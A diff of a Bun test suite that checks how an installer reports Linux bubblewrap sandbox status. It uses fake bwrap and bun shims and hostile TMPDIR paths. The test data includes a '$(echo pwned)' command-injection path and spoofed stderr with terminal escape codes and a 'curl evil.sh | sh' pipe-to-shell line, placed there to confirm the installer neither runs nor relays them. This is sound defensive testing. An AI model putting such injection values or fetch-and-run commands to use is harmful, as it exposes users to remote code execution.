@@ -18,7 +18,7 @@
 // The suite skips cleanly, with a visible reason, when `git` is genuinely absent
 // (install.sh requires it) — it does not silently pass.
 import { afterAll, beforeAll, expect, test } from "bun:test";
-import { mkdir, mkdtemp, rm, stat, access, readdir, chmod } from "node:fs/promises";
+import { mkdir, mkdtemp, rm, stat, access, readdir, chmod, symlink } from "node:fs/promises";
 import { constants as FS } from "node:fs";
 import { tmpdir, homedir } from "node:os";
 import { join, resolve, delimiter as PATH_DELIMITER } from "node:path";
@@ -41,28 +41,64 @@ const isLinuxHost = process.platform === "linux";
 const linuxGuardedTest = test.skipIf(!installable || !isLinuxHost);
 
 /**
- * PATH with every directory that would resolve `bwrap` removed — regardless
- * of whether THIS machine happens to have bubblewrap installed. AC1 requires
- * exactly this: the test must not depend on the real test machine lacking
- * bubblewrap. Directories that fail to read are kept (permission errors are
- * not evidence of anything); only a directory proven to contain `bwrap` is
- * dropped.
+ * PATH on which `bwrap` cannot be resolved — regardless of whether THIS
+ * machine happens to have bubblewrap installed. AC1 requires exactly this: the
+ * test must not depend on the real test machine lacking bubblewrap.
+ *
+ * The obvious implementation — drop every PATH directory containing `bwrap` —
+ * is wrong, and was silently broken on any host where bubblewrap is installed
+ * in `/usr/bin`: dropping that directory takes `bash`, `git`, `sed` and `uname`
+ * with it, so `install.sh` could not be spawned at all and these tests failed
+ * with `Executable not found in $PATH: "bash"`. It passed on CI only because
+ * `ubuntu-latest` has no bubblewrap, which is precisely the host dependency the
+ * helper exists to remove.
+ *
+ * So instead: for each directory that does contain `bwrap`, mirror its contents
+ * into a temp directory as symlinks, minus `bwrap`, and substitute the mirror
+ * in place of the original. Every other tool stays reachable; only bubblewrap
+ * disappears. Directories that fail to read are kept as they are — a permission
+ * error is not evidence of anything.
+ *
+ * Built once per suite; `mirrorRoot` must be inside the workspace so `afterAll`
+ * removes it.
  */
+let cachedPathWithoutBwrap: string | undefined;
+
 async function pathWithoutBwrap(): Promise<string> {
-  const dirs = (process.env.PATH ?? "").split(PATH_DELIMITER).filter(Boolean);
-  const kept: string[] = [];
-  for (const dir of dirs) {
-    try {
-      const entries = await readdir(dir);
-      if (entries.includes("bwrap")) {
-        continue;
-      }
-    } catch {
-      // Unreadable/missing directory: harmless to keep, nothing to exclude.
-    }
-    kept.push(dir);
+  if (cachedPathWithoutBwrap !== undefined) {
+    return cachedPathWithoutBwrap;
   }
-  return kept.join(PATH_DELIMITER);
+  const dirs = (process.env.PATH ?? "").split(PATH_DELIMITER).filter(Boolean);
+  const resolved: string[] = [];
+  let mirrorIndex = 0;
+
+  for (const dir of dirs) {
+    let entries: string[];
+    try {
+      entries = await readdir(dir);
+    } catch {
+      resolved.push(dir);
+      continue;
+    }
+    if (!entries.includes("bwrap")) {
+      resolved.push(dir);
+      continue;
+    }
+
+    const mirror = join(workspace, `path-mirror-${mirrorIndex++}`);
+    await mkdir(mirror, { recursive: true });
+    await Promise.all(
+      entries
+        .filter((entry) => entry !== "bwrap")
+        // A broken symlink (a dangling entry in the source dir) is harmless
+        // here: it resolves to nothing, exactly as it did before.
+        .map((entry) => symlink(join(dir, entry), join(mirror, entry)).catch(() => undefined)),
+    );
+    resolved.push(mirror);
+  }
+
+  cachedPathWithoutBwrap = resolved.join(PATH_DELIMITER);
+  return cachedPathWithoutBwrap;
 }
 
 async function fileExists(path: string): Promise<boolean> {
@@ -322,15 +358,56 @@ guardedTest(
   INSTALL_TIMEOUT_MS,
 );
 
-// --- AC1 (flow 142 / P4) -----------------------------------------------------
+// --- AC1 (flow 142 / P4), AC12 (keryx-linux-containment step 1) --------------
 //
-// "On a Linux host without bubblewrap, installation states that OS containment
-// is unavailable and names what provides it." The PATH handed to install.sh is
-// filtered to remove any directory that would resolve `bwrap` (see
-// `pathWithoutBwrap` above), so this assertion holds regardless of whether
-// bubblewrap actually happens to be installed on the machine running the test
-// suite — it is the installer's message under that PATH being tested, not a
-// fact about this host.
+// AC1: "On a Linux host without bubblewrap, installation states that OS
+// containment is unavailable and names what provides it."
+//
+// AC12 is the correction. The installer used to decide this from `command -v
+// bwrap`, and on Ubuntu 23.10+ that answer is "found" while every contained run
+// dies — so it printed "Filesystem containment and network-off are available"
+// on hosts where nothing was contained. It now delegates to `keryx sandbox
+// status`, which runs one trial contained command. The three tests below cover
+// the three outcomes: no launcher, a launcher that contains, and a launcher
+// that is present and does not contain (the shipped defect).
+//
+// The PATH handed to install.sh is filtered to remove any directory that would
+// resolve `bwrap` (see `pathWithoutBwrap` above), so each assertion holds
+// regardless of whether bubblewrap happens to be installed on the machine
+// running the suite — it is the installer's message under a controlled PATH
+// being tested, not a fact about this host.
+
+/** Write an executable shim into a fresh directory and return that directory. */
+async function shimDirWith(name: string, program: string, script: string): Promise<string> {
+  const dir = join(workspace, name);
+  await mkdir(dir, { recursive: true });
+  const shim = join(dir, program);
+  await Bun.write(shim, script);
+  await chmod(shim, 0o755);
+  return dir;
+}
+
+/** A `bwrap` shim directory. */
+function bwrapShim(name: string, script: string): Promise<string> {
+  return shimDirWith(name, "bwrap", script);
+}
+
+/**
+ * Surface WHY install.sh failed in the CI log before asserting on the exit
+ * code. A bare `Expected 0` hides the installer's own stderr, which is exactly
+ * what made the original CI-only failure (git exit 128) undiagnosable from the
+ * run log — see the AC4 test above. Every installer assertion goes through this.
+ */
+function expectInstallSucceeded(label: string, install: Ran): void {
+  if (install.exitCode !== 0) {
+    console.error(
+      `[install-global.test] ${label} install exited ${install.exitCode}\n` +
+        `----- stderr -----\n${install.stderr}\n----- stdout -----\n${install.stdout}`,
+    );
+  }
+  expect(install.exitCode).toBe(0);
+}
+
 linuxGuardedTest(
   "AC1: Linux install without bubblewrap on PATH states OS containment is unavailable and names bubblewrap",
   async () => {
@@ -338,46 +415,349 @@ linuxGuardedTest(
     const install = await run(["bash", INSTALL_SH, "--global"], {
       env: installEnv({ PATH: filteredPath, KERYX_BIN_DIR: join(workspace, "bin-ac1") }),
     });
-    if (install.exitCode !== 0) {
-      console.error(
-        `[install-global.test] AC1 install exited ${install.exitCode}\n` +
-          `----- stderr -----\n${install.stderr}\n----- stdout -----\n${install.stdout}`,
-      );
-    }
     // Never a gate: install.sh must still succeed even though containment is
     // unavailable — this is a report, not a blocker (P4's "expected outcome").
-    expect(install.exitCode).toBe(0);
+    expectInstallSucceeded("AC1", install);
 
     expect(install.stdout).toMatch(/OS containment is unavailable/i);
     expect(install.stdout).toMatch(/bubblewrap/i);
     // AC1 requires it NAME what provides containment, not just say "missing".
     expect(install.stdout).toMatch(/install it:.*bubblewrap/i);
+    // Nothing was probed, because there was nothing to probe.
+    expect(install.stdout).toMatch(/containment probe: not run/i);
   },
   INSTALL_TIMEOUT_MS,
 );
 
 linuxGuardedTest(
-  "AC1: falsifiable — the same run WITH bubblewrap on PATH does not claim containment is unavailable",
+  "AC12: THE DEFECT — a bwrap that is present and fails to contain is reported as NOT working, verbatim",
   async () => {
-    // Proves the AC1 assertion above is load-bearing: fabricate a fake `bwrap`
-    // on PATH (never executed — install.sh only checks `command -v bwrap`) and
-    // confirm the negative claim disappears.
-    const shimDir = join(workspace, "bwrap-shim");
-    await mkdir(shimDir, { recursive: true });
-    const fakeBwrap = join(shimDir, "bwrap");
-    await Bun.write(fakeBwrap, "#!/bin/sh\nexit 0\n");
-    await chmod(fakeBwrap, 0o755);
+    // This shim reproduces the exact failure measured on a stock Ubuntu 24.04:
+    // the binary is on PATH, `command -v` finds it, and it cannot build its
+    // boundary. Before the probe, install.sh printed "Filesystem containment
+    // and network-off are available" in precisely this situation.
+    const shimDir = await bwrapShim(
+      "bwrap-shim-broken",
+      "#!/bin/sh\necho 'bwrap: setting up uid map: Permission denied' >&2\nexit 1\n",
+    );
+    const filteredPath = await pathWithoutBwrap();
+    const install = await run(["bash", INSTALL_SH, "--global"], {
+      env: installEnv({
+        PATH: `${shimDir}${PATH_DELIMITER}${filteredPath}`,
+        KERYX_BIN_DIR: join(workspace, "bin-ac12-broken"),
+      }),
+    });
+    expectInstallSucceeded("AC12 broken-shim", install);
+
+    // The launcher IS found — and that is explicitly not the same as working.
+    expect(install.stdout).toMatch(/containment probe: FAILED/i);
+    expect(install.stdout).toMatch(/OS containment is unavailable/i);
+    // The launcher's own words, quoted rather than paraphrased.
+    expect(install.stdout).toContain("bwrap: setting up uid map: Permission denied");
+    // The remediation names the AppArmor profile…
+    expect(install.stdout).toContain("/etc/apparmor.d/bwrap");
+    // …and never the machine-wide sysctl, which ADR-0010 rejected outright.
+    expect(install.stdout).not.toContain("apparmor_restrict_unprivileged_userns");
+    // The sentence that was the defect.
+    expect(install.stdout).not.toMatch(/containment and network-off are available/i);
+  },
+  INSTALL_TIMEOUT_MS,
+);
+
+linuxGuardedTest(
+  "AC12: falsifiable — a bwrap that DOES contain the trial run is reported as working",
+  async () => {
+    // Proves the two assertions above are load-bearing rather than a
+    // permanently-negative report: the only difference from the previous case
+    // is that this shim execs the wrapped command instead of failing.
+    //
+    // `wrapBwrap` produces `bwrap <flags…> -- <cmd> [args…]`, so the shim
+    // discards everything up to and including the `--` and runs the rest.
+    const shimDir = await bwrapShim(
+      "bwrap-shim-working",
+      '#!/bin/sh\nwhile [ "$#" -gt 0 ]; do\n  if [ "$1" = "--" ]; then shift; break; fi\n  shift\ndone\nexec "$@"\n',
+    );
+    const filteredPath = await pathWithoutBwrap();
+    const install = await run(["bash", INSTALL_SH, "--global"], {
+      env: installEnv({
+        PATH: `${shimDir}${PATH_DELIMITER}${filteredPath}`,
+        KERYX_BIN_DIR: join(workspace, "bin-ac12-working"),
+      }),
+    });
+    expectInstallSucceeded("AC12 working-shim", install);
+    expect(install.stdout).toMatch(/containment probe: OK/i);
+    expect(install.stdout).not.toMatch(/OS containment is unavailable/i);
+    expect(install.stdout).toMatch(/confirmed by a trial contained command/i);
+    // The trial exercised filesystem containment and network-off. It exercised
+    // nothing about the allowlist or masking, and those rows are unimplemented
+    // on Linux anyway — so no row may read as confirmed except the two.
+    expect(install.stdout.match(/confirmed by a trial contained command/gi)?.length).toBe(2);
+  },
+  INSTALL_TIMEOUT_MS,
+);
+
+linuxGuardedTest(
+  "AC12: when `keryx sandbox status` cannot run at all, the installer claims NOTHING and still exits 0",
+  async () => {
+    // The one branch left where the installer could regress into an optimistic
+    // guess. A keryx that cannot start must produce "nothing is claimed either
+    // way" — never a containment claim, and never a failed install, because
+    // this is a report and not a gate.
+    //
+    // The failure is injected by pre-seeding KERYX_BIN_DIR with a `keryx`
+    // wrapper that exits non-zero; install.sh overwrites it with the real
+    // wrapper, so instead the wrapper's TARGET is broken: KERYX_HOME points at
+    // a directory whose src/cli.ts will not exist because the clone is sent
+    // somewhere else. Simpler and more direct: shadow `bun` with a shim that
+    // fails only for `sandbox status`.
+    const binDirForRun = join(workspace, "bin-ac12-unknown");
+
+    // The shim shadows `bun` on PATH and passes everything else through to the
+    // REAL bun by absolute path. Resolved here, and asserted, because a
+    // relative `exec bun` would re-resolve through the shimmed PATH and find
+    // the shim again — an infinite re-exec that presents as a silent 240s
+    // timeout rather than a failure. `hasBun` (above) admits a host where bun
+    // exists only under $HOME, so the fallback is a real path, not a guess.
+    const realBun = Bun.which("bun") ?? join(homedir(), ".bun", "bin", "bun");
+    expect(await fileExists(realBun)).toBe(true);
+
+    const shimDir = await shimDirWith(
+      "keryx-status-broken",
+      "bun",
+      [
+        "#!/bin/sh",
+        "# Fail only the containment report; every other bun invocation (install,",
+        "# --version, the CLI itself) passes through to the real bun.",
+        'for arg in "$@"; do',
+        '  if [ "$arg" = "sandbox" ]; then',
+        '    echo "keryx: exploded while reporting containment" >&2',
+        "    exit 3",
+        "  fi",
+        "done",
+        `exec ${JSON.stringify(realBun)} "$@"`,
+      ].join("\n"),
+    );
 
     const filteredPath = await pathWithoutBwrap();
     const install = await run(["bash", INSTALL_SH, "--global"], {
       env: installEnv({
         PATH: `${shimDir}${PATH_DELIMITER}${filteredPath}`,
-        KERYX_BIN_DIR: join(workspace, "bin-ac1-present"),
+        KERYX_BIN_DIR: binDirForRun,
       }),
     });
-    expect(install.exitCode).toBe(0);
-    expect(install.stdout).not.toMatch(/OS containment is unavailable/i);
-    expect(install.stdout).toMatch(/bubblewrap: found/i);
+    expectInstallSucceeded("AC12 unknown-status", install);
+
+    expect(install.stdout).toMatch(/could not determine containment status/i);
+    expect(install.stdout).toMatch(/nothing is claimed either way/i);
+    // The reason is surfaced rather than swallowed — this is the one path where
+    // the installer admits it does not know, so the why is all it has to offer.
+    expect(install.stdout).toContain("keryx: exploded while reporting containment");
+    // And above all: no claim, in either direction.
+    expect(install.stdout).not.toMatch(/containment probe: (OK|FAILED)/i);
+    expect(install.stdout).not.toMatch(/are available/i);
+  },
+  INSTALL_TIMEOUT_MS,
+);
+
+// --- The installer's own bash, under test ------------------------------------
+//
+// Every regression on this branch so far has been in `report_sandbox_status`:
+// round 1 shipped a `sed` pipeline that `set -o pipefail` could turn into an
+// abort, round 2 replaced it with an `mktemp` that aborted on an unwritable
+// TMPDIR, and round 3 found the RETURN trap aborting on an apostrophe in the
+// path. Each was caught by a human reading the diff, and each was then fixed
+// with nothing to stop the next one.
+//
+// These two drive the real script. They are the tests the purity guard's own
+// argument demands: a diff is checked once, a test is checked forever.
+
+// Each of the three regressions has its own case, because each had its own
+// mechanism and a single "weird TMPDIR" test would have covered only the last
+// one. (It did: the first version of this block asserted an apostrophe and
+// claimed to cover unwritability too, which review caught.)
+const HOSTILE_TMPDIRS: {
+  label: string;
+  regression: string;
+  make: () => Promise<string>;
+  skipAsRoot?: boolean;
+}[] = [
+  {
+    label: "apostrophe in the path",
+    regression: "round 3 — eager trap expansion made the trap body a syntax error, fatal under set -e",
+    make: async () => {
+      // Also exercises the injection shape: before the deferred-expansion fix,
+      // a `$(...)` inside TMPDIR was executed by the installer's own shell.
+      const dir = join(workspace, "tmp-with-'quote-$(echo pwned)");
+      await mkdir(dir, { recursive: true });
+      return dir;
+    },
+  },
+  {
+    label: "unwritable directory",
+    regression: "round 2 — mktemp failing under set -e aborted the installer",
+    // Root bypasses directory write permission, so under a root CI runner this
+    // case would silently stop reproducing the regression and become a
+    // happy-path test. Skipped there rather than passing for the wrong reason;
+    // the non-existent-path case below reaches the same `mktemp` failure and is
+    // root-proof, so the mechanism stays covered either way.
+    skipAsRoot: true,
+    make: async () => {
+      const dir = join(workspace, "tmp-unwritable");
+      await mkdir(dir, { recursive: true });
+      await chmod(dir, 0o500);
+      return dir;
+    },
+  },
+  {
+    label: "path that does not exist",
+    regression: "round 2 — same mktemp failure, reached a different way",
+    make: async () => join(workspace, "tmp-does-not-exist", "nope"),
+  },
+];
+
+const isRoot = process.getuid?.() === 0;
+
+for (const { label, regression, make, skipAsRoot } of HOSTILE_TMPDIRS) {
+  const guarded = skipAsRoot === true && isRoot ? test.skip : linuxGuardedTest;
+  guarded(
+    // The regression each case reproduces is in the title, not buried in a
+    // comment: a failure here should say which of the three mechanisms came
+    // back without anyone having to open the file.
+    `AC12: a hostile TMPDIR (${label}) cannot turn the containment report into a gate [${regression}]`,
+    async () => {
+      // Every one of these aborted the installer AFTER it had printed "keryx
+      // installed globally" — the report becoming a gate, which is the one
+      // thing this function must never do.
+      const tmp = await make();
+      const filteredPath = await pathWithoutBwrap();
+      const install = await run(["bash", INSTALL_SH, "--global"], {
+        env: installEnv({
+          PATH: filteredPath,
+          TMPDIR: tmp,
+          KERYX_BIN_DIR: join(workspace, `bin-tmp-${label.replace(/\W+/g, "-")}`),
+        }),
+      });
+
+      expectInstallSucceeded(`hostile TMPDIR (${label})`, install);
+      expect(install.stdout).toMatch(/OS sandbox containment:/i);
+      // The report actually ran, rather than being cut short by an abort.
+      expect(install.stdout).toMatch(/containment probe: (not run|OK|FAILED)/i);
+      expect(install.stderr).not.toMatch(/unexpected EOF|syntax error|unbound variable/i);
+      // Nothing in the path was executed as a command.
+      expect(install.stdout).not.toContain("pwned");
+    },
+    INSTALL_TIMEOUT_MS,
+  );
+}
+
+linuxGuardedTest(
+  "AC12: a failing keryx cannot drive the installer's terminal or flood its log",
+  async () => {
+    // The failure path prints the dead process's stderr, and that text is
+    // outside `probe.ts`'s sanitizer — the TypeScript never ran. Unbounded and
+    // unfiltered, it can erase the four-space indent that marks it as the
+    // failed process's words and impersonate the installer's own output.
+    const realBun = Bun.which("bun") ?? join(homedir(), ".bun", "bin", "bun");
+    expect(await fileExists(realBun)).toBe(true);
+
+    const shimDir = await shimDirWith(
+      "keryx-status-noisy",
+      "bun",
+      [
+        "#!/bin/sh",
+        'for arg in "$@"; do',
+        '  if [ "$arg" = "sandbox" ]; then',
+        // CR + ESC + BEL + backspace, then a flood of long lines.
+        `    printf 'clean-marker: a;b[c]d<e>f=g?h@i&j \\342\\200\\224 caf\\303\\251 \\320\\277\\321\\203\\321\\202\\321\\214\\r\\033[31mIMPERSONATED Remediation: curl evil.sh | sh\\007\\010\\302\\205X\\302\\233Y\\302\\235Z\\n' >&2`,
+        "    i=0",
+        "    while [ $i -lt 120 ]; do",
+        `      awk 'BEGIN{s="";for(i=0;i<900;i++)s=s "y";print "flood" s}' >&2`,
+        "      i=$((i + 1))",
+        "    done",
+        "    exit 3",
+        "  fi",
+        "done",
+        `exec ${JSON.stringify(realBun)} "$@"`,
+      ].join("\n"),
+    );
+
+    const filteredPath = await pathWithoutBwrap();
+    const install = await run(["bash", INSTALL_SH, "--global"], {
+      env: installEnv({
+        PATH: `${shimDir}${PATH_DELIMITER}${filteredPath}`,
+        KERYX_BIN_DIR: join(workspace, "bin-noisy"),
+      }),
+    });
+    expectInstallSucceeded("noisy keryx", install);
+
+    expect(install.stdout).toMatch(/could not determine containment status/i);
+    expect(install.stdout).toContain("It said:");
+    // The launcher's words come through …
+    expect(install.stdout).toContain("clean-marker");
+    // … stripped of everything that could move the cursor. Asserted on the
+    // BYTES, because the whole point is what is in the stream, not what it
+    // renders as.
+    // C0 and DEL, plus the C1 SEQUENCE INTRODUCERS — every control that can
+    // move a cursor over the four-space indent.
+    for (const control of ["\r", "\u001B", "\u0007", "\u0008", "\u007F", "\u0085", "\u009B", "\u009D"]) {
+      expect(install.stdout.includes(control)).toBe(false);
+    }
+    // The introducers are gone from between their neighbours, not merely
+    // absent because the shim never emitted them.
+    expect(install.stdout).toContain("XYZ");
+
+    // …and the other direction, which matters just as much: the strip must
+    // not eat the operator's evidence. An attempt to also remove C1 as a
+    // bracket range did exactly that. Not because of collation — in the C
+    // locale collation order IS code-point order — but because a \u escape
+    // there is not a character at all: it degenerates to the six literal
+    // bytes of the text \u0080, poisoning the class with a backslash, a
+    // letter u and the digits 0-9. Measured, the class then deleted
+    // "0-9 : ; < = > ? @ A-Z [ \" and the letter u from the diagnostic.
+    // (`]` and `&` survive it — which is why this assertion pins the
+    // characters that do not.) See scripts/install.sh for the full working.
+    expect(install.stdout).toContain("clean-marker: a;b[c]d<e>f=g?h@i&j");
+
+    // NON-ASCII MUST SURVIVE. This is the assertion that stops the next
+    // attempt at C1: a byte range [\x80-\x9f] is ASCII-safe and looks
+    // correct, and it corrupts any character whose UTF-8 encoding contains a
+    // byte in 0x80-0x9F — legal continuation bytes. Measured, `— café путь`
+    // became `? café п???`: the em dash and three of the four Cyrillic
+    // letters were destroyed, while é (c3 a9) and п (d0 bf) survived because
+    // a9 and bf are above 0x9F. Hence the em dash in the expected string.
+    expect(install.stdout).toContain("— café путь");
+    // … and bounded, in both directions.
+    expect(install.stdout).toContain("(line truncated)");
+    expect(install.stdout).toContain("(output truncated)");
+    const flooded = install.stdout.split("\n").filter((line) => line.includes("flood"));
+    expect(flooded.length).toBeLessThanOrEqual(50);
+    for (const line of flooded) {
+      expect(line.length).toBeLessThan(600);
+    }
+  },
+  INSTALL_TIMEOUT_MS,
+);
+
+linuxGuardedTest(
+  "AC12: the PROJECT install reports the probe too — the two-argument delegation form works",
+  async () => {
+    // `report_sandbox_status` is invoked in two shapes: `"$BIN_DIR/keryx"` for
+    // --global and `"$BUN_BIN" "$RUNTIME_DIR/src/cli.ts"` for --project. Only
+    // the first was covered, so a quoting or argument-order regression in the
+    // second would ship silently.
+    const projectDir = join(workspace, "project-install");
+    await mkdir(projectDir, { recursive: true });
+
+    const filteredPath = await pathWithoutBwrap();
+    const install = await run(["bash", INSTALL_SH, "--project", "--yes", "--no-gdgraph", "--no-gdctx"], {
+      env: installEnv({ PATH: filteredPath }),
+      cwd: projectDir,
+    });
+    expectInstallSucceeded("AC12 project-install", install);
+
+    expect(install.stdout).toMatch(/OS sandbox containment:/i);
+    expect(install.stdout).toMatch(/containment probe: not run/i);
+    expect(install.stdout).toMatch(/OS containment is unavailable/i);
   },
   INSTALL_TIMEOUT_MS,
 );
